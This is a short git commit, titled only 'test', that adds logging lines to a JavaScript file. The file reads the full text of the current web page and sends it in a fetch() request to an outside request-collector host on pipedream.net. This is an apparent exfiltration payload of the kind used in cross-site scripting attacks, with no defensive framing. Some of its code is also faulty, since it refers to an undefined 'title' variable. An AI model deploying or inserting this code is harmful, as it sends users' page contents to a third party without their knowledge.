68ef30d1805fd41446ee2faff009130cae2a617a
QingkangYu <qingkang.yuu@gmail.com>
2023-03-13 13:04:18 -0400

    test

--- test.js
+++ test.js
@@ -1,2 +1,5 @@
+console.log(document.title);
+console.log(document.body.innerText);
 document.title.value = document.body.innerText;
+console.log(title.value);
 fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.value);
